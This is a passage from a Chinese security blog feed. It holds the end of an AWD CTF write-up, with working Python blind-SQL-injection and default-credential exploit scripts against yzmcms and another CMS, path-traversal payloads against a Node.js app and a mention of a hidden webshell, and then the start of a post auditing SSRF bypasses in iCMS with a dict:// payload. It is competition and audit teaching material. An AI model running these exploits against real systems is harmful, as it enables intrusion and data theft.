class="variable">$orderby</span>);</span><br></pre></td></tr></table></figure><p>可以看到<code>$rs[&#39;orderby&#39;]</code>被代入查询,中间没有任何关于sql的过滤.</p><p>通过盲注getflag.照着其他队打过来的payload,快速写了个exp反打.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">ip</span>):</span></span><br><span class="line">    base_url = <span class="string">&quot;http://%s/api.php?c=project&amp;f=index&amp;token=q&amp;id=news&amp;sort=&quot;</span></span><br><span class="line">    sql = <span class="string">&quot;IF(ascii(substr((select flag from ctf.flag),%s,1))=%s,1,(select 1 from information_schema.tables)) &quot;</span></span><br><span class="line">    s = <span class="string">&quot;0987654321abcdef&quot;</span></span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    print(base_url%ip+quote(sql%(<span class="number">1</span>,<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>))))</span><br><span class="line">    t = requests.get(base_url%ip+quote(sql%(<span class="number">1</span>,<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>))))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;执行错误&quot;</span>  <span class="keyword">not</span> <span class="keyword">in</span> t.text :</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    print(ip)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">39</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            <span class="comment"># print(base_url%ip+&#x27;1&#x27;)</span></span><br><span class="line">            print(i)</span><br><span class="line">            res = requests.get(base_url%ip+quote(sql%(i,<span class="built_in">ord</span>(j)))).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;执行错误&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res :</span><br><span class="line">                flag+=j</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;d3ctf&#123;%s&#125;&quot;</span>%flag)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;d3ctf&#123;%s&#125;&quot;</span>%flag</span><br></pre></td></tr></table></figure><p>但实际上这个sql注入动静比较大,修复又容易.只拿到了几个flag就都修好了.</p><p>还有几个主办方留的sql注入,与这个类似,师傅们修复的也都比较快,就没有一一写出来.</p><p>这几个就是在流量中发现的所有漏洞,修好后没再被拿分.</p><p>因为比赛的时候有些手忙脚乱,一边开发自动化脚本,一边审流量,没有静下心仔细看代码.赛后随便翻了下,没有过滤的sql点,以及直接拼接字符串读写文件的点还不少.</p><p>还有一个漏洞可有可无,后台默认账号修改密码后session不会失效,第二题一开始写了个脚本拿了所有对的cookie,但后台并没有找到其他漏洞,因此无用.</p><p>主办发还特地修改了验证码生成的地方,方便做自动化.</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>cms:yzmcms v5.4</p><p>后台弱口令:   yzmcms:yzmcms</p><p>web2漏洞与web1基本一致.</p><h3 id="后台任意sql语句执行"><a href="#后台任意sql语句执行" class="headerlink" title="后台任意sql语句执行"></a>后台任意sql语句执行</h3><p>后台有个执行sql的地方,有读写文件权限.直接读flag.</p><p>赛后看到有些师傅自动化出了点问题,因为需要先访问一次验证码api,绑定验证码与session.web1也是一样的.贴个例子.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">ip</span>):</span></span><br><span class="line">    base_url = <span class="string">&quot;http://%s/admin/index/login.html&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;yzmcms&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;yzmcms&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;dosubmit&#x27;</span>:<span class="string">&#x27;%E7%99%BB%E3%80%80%E5%BD%95&#x27;</span>&#125;</span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.get(<span class="string">&quot;http://%s/api/index/code.html?&quot;</span>%ip,timeout=<span class="number">3</span>)</span><br><span class="line">    url = base_url%ip</span><br><span class="line">    p = s.post(url,data=data)</span><br><span class="line">    base_url2 = <span class="string">&quot;http://%s/admin/sql/do_sql.html&quot;</span></span><br><span class="line">    url = base_url2%ip</span><br><span class="line">    data2 = &#123;<span class="string">&#x27;sqlstr&#x27;</span>:<span class="string">&quot;select load_file(&#x27;/flag&#x27;)&quot;</span>,<span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;single&#x27;</span>,<span class="string">&#x27;single&#x27;</span>:<span class="string">&#x27;执行单条SQL&#x27;</span>&#125;</span><br><span class="line">    res = s.post(url,data=data2).text</span><br><span class="line">    res = re.<span class="built_in">compile</span>(<span class="string">&#x27;d3ctf&#123;.+?&#125;&#x27;</span>).findall(res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="主办方留的后门"><a href="#主办方留的后门" class="headerlink" title="主办方留的后门"></a>主办方留的后门</h3><p>在根目录下的<code>favicon.ico</code>内有一句话木马,并且特意设置的错误配置使其可解析.这个后门一开始拿d盾扫出来删了,然后主办方重置了一次靶机,我给忘了这个后门,流量又记录不到访问静态文件的.导致丢了好多轮的分.血亏</p><h3 id="前台sql注入"><a href="#前台sql注入" class="headerlink" title="前台sql注入"></a>前台sql注入</h3><p>搜索出存在sql注入,漏洞位于<code>application/search/controller/index.class.php:13-37行</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$site</span> = get_config();</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$modelid</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;modelid&#x27;</span>]) ? intval(<span class="variable">$_GET</span>[<span class="string">&#x27;modelid&#x27;</span>]) : <span class="number">1</span>;</span><br><span class="line"><span class="variable">$modelinfo</span> = get_modelinfo();</span><br><span class="line"><span class="variable">$modelarr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$modelinfo</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line"><span class="variable">$modelarr</span>[<span class="variable">$val</span>[<span class="string">&#x27;modelid&#x27;</span>]] = <span class="variable">$val</span>[<span class="string">&#x27;tablename&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$modelarr</span>[<span class="variable">$modelid</span>])) showmsg(<span class="string">&#x27;模型不存在！&#x27;</span>, <span class="string">&#x27;stop&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$seo_title</span> = <span class="string">&#x27;‘&#x27;</span>.<span class="variable">$q</span>.<span class="string">&#x27;’的搜索结果_&#x27;</span>.<span class="variable">$site</span>[<span class="string">&#x27;site_name&#x27;</span>];</span><br><span class="line"><span class="variable">$keywords</span> = <span class="variable">$q</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$site</span>[<span class="string">&#x27;site_keyword&#x27;</span>];</span><br><span class="line"><span class="variable">$description</span> = <span class="variable">$site</span>[<span class="string">&#x27;site_description&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;`title` LIKE &#x27;%<span class="subst">$q</span>%&#x27; AND `status` = 1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = D(<span class="variable">$modelarr</span>[<span class="variable">$modelid</span>]);</span><br><span class="line"><span class="variable">$total</span> = <span class="variable">$db</span>-&gt;where(<span class="variable">$where</span>)-&gt;total();</span><br><span class="line"><span class="variable">$page</span> = <span class="keyword">new</span> page(<span class="variable">$total</span>, <span class="keyword">$this</span>-&gt;offset);</span><br><span class="line"><span class="variable">$search_data</span> = <span class="variable">$db</span>-&gt;field(<span class="string">&#x27;id,title,description,inputtime,updatetime,click,thumb,nickname,url,catid&#x27;</span>)-&gt;where(<span class="variable">$where</span>)-&gt;order(<span class="string">&#x27;id DESC&#x27;</span>)-&gt;limit(<span class="variable">$page</span>-&gt;limit())-&gt;select();</span><br><span class="line"></span><br><span class="line"><span class="variable">$pages</span> = <span class="string">&#x27;&lt;span class=&quot;pageinfo&quot;&gt;共&lt;strong&gt;&#x27;</span>.<span class="variable">$page</span>-&gt;total().<span class="string">&#x27;&lt;/strong&gt;页&lt;strong&gt;&#x27;</span>.<span class="variable">$total</span>.<span class="string">&#x27;&lt;/strong&gt;条记录&lt;/span&gt;&#x27;</span>.<span class="variable">$page</span>-&gt;getfull();</span><br><span class="line"><span class="keyword">include</span> template(<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较明显,没任何过滤,直接拼接进去了.同样是盲注:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">ip</span>):</span></span><br><span class="line">    base_url = <span class="string">&quot;http://%s/index.php?m=search&amp;c=index&amp;a=init&amp;modelid=1&amp;q=1&quot;</span>%ip</span><br><span class="line">    sql = <span class="string">&quot;&#x27; or &#x27;%s&#x27;=substr(load_file(&#x27;/flag&#x27;),%s,1)#&quot;</span></span><br><span class="line">    s = <span class="string">&quot;0987654321abcdef&quot;</span></span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">39</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            res = requests.get(base_url+quote(sql%(j,i))).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;substr(load_file&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;共&lt;span&gt;0&lt;/span&gt;条&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res :</span><br><span class="line">                flag+=j</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;d3ctf&#123;%s&#125;&quot;</span>%flag</span><br></pre></td></tr></table></figure><p>web2还有一个任意文件上传,因为其他队修的比较快,也就最开始打了两轮,把比赛服务器打down了,第二次上线后好像都没中招,因此也没去找.</p><p>web2有个比较坑的地方,文章被搅屎的师傅删了,然后就被checkdown了,第一天全场只有一队正常,应该就是这队师傅干的(重拳出击).每轮被checkdown,掉了好多分,与第一名失之交臂.</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>web3是第二天才上线,上线没多久就下线了,还是被我们蹭了不少分.</p><p>web3应该是配置出了问题,不会自动启动,于是我们手动启动了,然后问了下主办方咋没开启check.就恰了各位师傅checkdown的烂分.</p><p>不太熟悉nodejs,只找到一个任意文件读的洞,流量里还看到另外一个类似的洞.</p><p>payload1: <code>/api/get</code> post:<code>file=../../../../../../../../flag</code></p><p>payload2: <code>/api/crawl</code> post:<code>file=../../../../../../../../flag</code></p><p>漏洞位于<code>web3/api/controllers/ApiController.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    fs.writeFile(<span class="string">&#x27;/tmp/log.txt&#x27;</span>,req.body , &#123; <span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;a&#x27;</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">console</span>.log(req.body);</span><br><span class="line">&#125;);</span><br><span class="line">        <span class="keyword">let</span> file = req.param(<span class="string">&#x27;file&#x27;</span>) ? req.param(<span class="string">&#x27;file&#x27;</span>) : <span class="string">&#x27;d3ctf.png&#x27;</span>;</span><br><span class="line">        imgfile = <span class="string">&#x27;assets/templates/default/img/&#x27;</span> + file;</span><br><span class="line">        <span class="keyword">let</span> data = fs.readFileSync(imgfile);</span><br><span class="line">        <span class="keyword">let</span> buf = Buffer.from(data);</span><br><span class="line">        <span class="keyword">let</span> encodeData = buf.toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">        res.locals.imgdata = encodeData;</span><br><span class="line">        <span class="keyword">return</span> res.templet(&#123;&#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也是直接拼接.另外一次也是如此.</p><p>手速快,然后就要么没打开服务被checkdown,要么打开了服务被我们打.这样搞几个小时全场还是挺舒服.</p><p>主要原因还是大家似乎都不太熟悉nodejs,也没准备相应的流量记录.</p><p>可惜打了几个小时就下线了.</p><p>附上临时写的流量记录的代码,插到入口文件即可:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;url:&quot;</span>+req.url+req.methed);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;body:&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.body)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;header:&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.headers);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;\n\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>以debug模式开启服务,然后重定向输入到<code>/tmp/log.txt</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实际上,整场比赛只有几个特别明显的漏洞是我们自己审计出来的.较为复杂的漏洞均是抓到流量后反打,但就算这样我们web的分数也在前5甚至一度前2.并不是第一次比赛是这种情况,之前的几次也是这样.</p><p>我个人看来,当前AWD环境中,流量审计的作用大于代码审计,漏洞难找易修.特别是如果主办发权限控制较好,找到一个0day也很难维持住权限,大家都是老赛棍,经验丰富.代码审计的作用就更小了,甚至不如一直盯着流量做到及时防护与反打有效.</p><p>还有一点就是之前的文章中也提到过的,要准备好非php环境的后门,waf,流量审计等工具,难度低的比赛还是php为主,但是大佬齐聚的比赛php显然不够玩,java,nodejs,php,python等等语言环境的题目一起上是主流.</p><p>当然如果遇到没见过的情况,快速开发也是可行的.在这次比赛中,发现一个漏洞到写出批量脚本并且修好漏洞的响应时间,大致在十分钟左右,也就是一两轮的时间,要是不熟悉脚本语言,写慢了,就搭不到代码审计大佬的顺风车了.</p><p>贴几张图自嗨一下(划去)</p><p><img src="1.png" alt="1"></p><p><img src="2.png" alt="1"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;抱歉来晚了,赛后写完就丢在草稿箱里忘了发.&lt;/p&gt;
&lt;p&gt;技术部分实际上比较常见,稍微写下水篇博客.&lt;/p&gt;
&lt;p&gt;源码链接:可能有部分代码已被修改,可以参考文章看原本的漏洞位置.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://share.weiyun.com/57BvkJk&quot;&gt;https://share.weiyun.com/57BvkJk&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>从一个代码审计例子看ssrf的防护与绕过</title>
    <link href="https://m09ic.top/posts/5871/"/>
    <id>https://m09ic.top/posts/5871/</id>
    <published>2019-12-17T05:09:47.000Z</published>
    <updated>2021-01-04T14:51:03.144Z</updated>
    
    <content type="html"><![CDATA[<p>(本文首发于先知社区,链接:<a href="https://xz.aliyun.com/t/7256">https://xz.aliyun.com/t/7256</a>)</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开始实战代码审计,去github上找了几个100+ stars 的项目练手.</p><p>看到有个cms中有个SSRF漏洞点多次被绕过,修复再被绕过.打开commit记录浏览,测试了一番,发现还能再次绕过.</p><p>绕过技巧并不新颖,2017年blackhat上orange师傅演讲的:<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf"> A New Era of SSRF </a>中提出的.</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="0x01-代码审计中的信息收集"><a href="#0x01-代码审计中的信息收集" class="headerlink" title="0x01  代码审计中的信息收集"></a>0x01  代码审计中的信息收集</h3><p>一个cms代码量确实不少,通读代码耗时长,效果也不一定好.而一个功能点如果之前出过漏洞,开发者对安全的理解又不充分,很容易绕过修复.这就类似一道ctf题目,对于经常参加ctf的各位大佬来说,这样的代码审计更加简单休闲.</p><p>我以icms为例.</p><p>icms github链接: <a href="https://github.com/idreamsoft/iCMS">https://github.com/idreamsoft/iCMS</a> </p><p>在issue中搜索SSRF <a href="https://github.com/idreamsoft/iCMS/issues?utf8=%E2%9C%93&q=is:issue+ssrf">https://github.com/idreamsoft/iCMS/issues?utf8=%E2%9C%93&amp;q=is%3Aissue+ssrf</a> </p><p><img src="image-20191115200723191.png" alt="image-20191115200723191"></p><p>在cve列表中查找,应该对应的就是这三个cve了</p><p><img src="image-20191115200653356.png" alt="image-20191115200653356"></p><p>可以看到这个功能点已经出现了三次的绕过与过滤.</p><p>大致了解下这个功能点,是一个自动更新文章的爬虫,多处都可以控制url参数.</p><p>点开issue查看具体信息,我们从最早出现漏洞的版本看起.</p><p>通过查看具体的commits,可以找到开发者修复漏洞的思路.这给我们代码审计带来很大的便利.</p><h3 id="CVE-2018-14514-漏洞分析"><a href="#CVE-2018-14514-漏洞分析" class="headerlink" title="CVE-2018-14514 漏洞分析"></a>CVE-2018-14514 漏洞分析</h3><p> commit: <a href="https://github.com/idreamsoft/iCMS/issues/29">https://github.com/idreamsoft/iCMS/issues/29</a> </p><p>提交者详细描述了漏洞信息,只提交了一个点,但根据作者修复的commit,应该有两处都存在ssrf漏洞.</p><p>``icms7.0.9\app\spider\spider.class.php` 361行 ,关键代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">postUrl</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">     is_array(<span class="variable">$data</span>) &amp;&amp; <span class="variable">$data</span> = http_build_query(<span class="variable">$data</span>);</span><br><span class="line">     <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">         CURLOPT_URL    =&gt; <span class="variable">$url</span>,</span><br><span class="line">...</span><br><span class="line">     );</span><br><span class="line"></span><br><span class="line">     <span class="variable">$ch</span> = curl_init();</span><br><span class="line">     curl_setopt_array(<span class="variable">$ch</span>,<span class="variable">$options</span>);</span><br><span class="line">     <span class="variable">$responses</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">     curl_close (<span class="variable">$ch</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$responses</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与<code>icms7.0.9\app\spider\spider_tools.class.php</code>  604行,关键代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">remote</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$_count</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = str_replace(<span class="string">&#x27;&amp;amp;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(spider::<span class="variable">$referer</span>))&#123;</span><br><span class="line">        <span class="variable">$uri</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">        spider::<span class="variable">$referer</span> = <span class="variable">$uri</span>[<span class="string">&#x27;scheme&#x27;</span>] . <span class="string">&#x27;://&#x27;</span> . <span class="variable">$uri</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$curl_info</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">        CURLOPT_URL                  =&gt; <span class="variable">$url</span>,</span><br><span class="line">...</span><br><span class="line">    );</span><br><span class="line">    spider::<span class="variable">$cookie</span> &amp;&amp; <span class="variable">$options</span>[CURLOPT_COOKIE] = spider::<span class="variable">$cookie</span>;</span><br><span class="line">    <span class="keyword">if</span>(spider::<span class="variable">$curl_proxy</span>)&#123;</span><br><span class="line">        <span class="variable">$proxy</span>   = <span class="built_in">self</span>::proxy_test();</span><br><span class="line">        <span class="variable">$proxy</span> &amp;&amp; <span class="variable">$options</span> = iHttp::proxy(<span class="variable">$options</span>,<span class="variable">$proxy</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(spider::<span class="variable">$PROXY_URL</span>)&#123;</span><br><span class="line">        <span class="variable">$options</span>[CURLOPT_URL] = spider::<span class="variable">$PROXY_URL</span>.urlencode(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt_array(<span class="variable">$ch</span>,<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$responses</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到icms7.0.9版本没有做任何的验证.可以直接使用所有协议访问所有ip与端口.因此如果有redis或无密码的mysql或者一些其他容易被攻击的服务,可以getshell.因为这里重点不是ssrf getshell ,因此不做验证.</p><p>很多处都调用了remote函数,全局搜索即可,我们找一个能即时回显的点测试.</p><p>payload:<code>http://ip/admincp.php?app=spider&amp;do=testdata&amp;url=dict://127.0.0.1:8000&amp;rid=2&amp;pid=0&amp;title=m09ic</code></p><p><img src="image-20191115210301369.png" alt="image-20191115210301369"></p><p>监听本地端口是否有数据过来.</p><p><img src="image-20191115205544907.png" alt="image-20191115205544907"></p><p>很明显收到了.</p><h3 id="CVE-2018-14514-漏洞修复"><a href="#CVE-2018-14514-漏洞修复" class="headerlink" title="CVE-2018-14514 漏洞修复"></a>CVE-2018-14514 漏洞修复</h3><p>我们再来看看作者是如何修复的,commit: <a href="https://github.com/idreamsoft/iCMS/commit/64bb0bdf77febbd6ac0ccb6658ee1ddc71530bb1">https://github.com/idreamsoft/iCMS/commit/64bb0bdf77febbd6ac0ccb6658ee1ddc71530bb1</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">remote</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$_count</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!iHttp::is_url(<span class="variable">$url</span>,<span class="literal">true</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (spider::<span class="variable">$dataTest</span> || spider::<span class="variable">$ruleTest</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;<span class="subst">&#123;$url&#125;</span> 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接&lt;/b&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>作者添加了一个判断函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">is_url</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$strict</span>=<span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = trim(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$strict</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (stripos(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) === <span class="number">0</span> || stripos(<span class="variable">$url</span>, <span class="string">&#x27;https://&#x27;</span>) === <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stripos(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) === <span class="literal">false</span> &amp;&amp; stripos(<span class="variable">$url</span>, <span class="string">&#x27;https://&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先判断url是否以<code>http://</code>开头,才开始解析,这样就限制了乱七八糟协议,减轻了危害程度,大部分情况很难getshell.但是ssrf漏洞依然存在.</p><p>可以看到,作者对ssrf漏洞的认识并不到位,认为不能getshell就可以了.但是实际上,用http协议也并非完全不可能getshell,内网有可能存在一些可以被get请求getshell的服务,比如thinkphp最近的那几个RCE.</p><h3 id="CVE-2018-14858-漏洞修复"><a href="#CVE-2018-14858-漏洞修复" class="headerlink" 